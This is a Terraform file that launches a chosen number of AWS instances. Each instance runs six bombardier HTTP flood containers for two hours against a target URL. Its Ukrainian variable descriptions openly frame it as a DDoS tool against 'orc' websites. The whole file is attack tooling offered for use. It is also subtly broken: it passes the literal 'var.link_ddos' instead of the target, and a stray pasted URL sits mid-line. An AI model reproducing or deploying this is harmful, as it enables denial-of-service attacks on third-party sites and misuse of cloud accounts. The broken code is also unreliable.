provider "aws" {
    region = "us-east-2"
    access_key = var.aws_key.access
    secret_key = var.aws_key.secret 
}

data "aws_ami" "ubuntu" {

    most_recent = true

    filter {
        name   = "name"
        values = ["ubuntu/images/hvm-ssd/ubuntu-focal-20.04-amd64-server-*"]
    }

    filter {
        name = "virtualization-type"
        values = ["hvm"]
    }

    owners = ["099720109477"]
}

variable "link_ddos" {
  description = "Ціль атаки - або введи сайт орків:"
  type = string
}


variable "kozaks" {
  description = "Скільки козаків пустити вбій(к-сть інстансів)"
  type = string
}

resource "aws_instance" "ddos"  {
  count = var.kozaks
  ami           = data.aws_ami.ubuntu.id
 (http://data.aws_ami.ubuntu.id/)  instance_type = "t2.micro"
  user_data = <<EOF
  #!/bin/bash
  sudo apt install docker.io -y
  sudo systemctl start docker
  docker run -d --rm alpine/bombardier -c 1000 -d 2h -l var.link_ddos
  docker run -d --rm alpine/bombardier -c 1000 -d 2h -l var.link_ddos
  docker run -d --rm alpine/bombardier -c 1000 -d 2h -l var.link_ddos
  docker run -d --rm alpine/bombardier -c 1000 -d 2h -l var.link_ddos
  docker run -d --rm alpine/bombardier -c 1000 -d 2h -l var.link_ddos
  docker run -d --rm alpine/bombardier -c 1000 -d 2h -l var.link_ddos
EOF
}
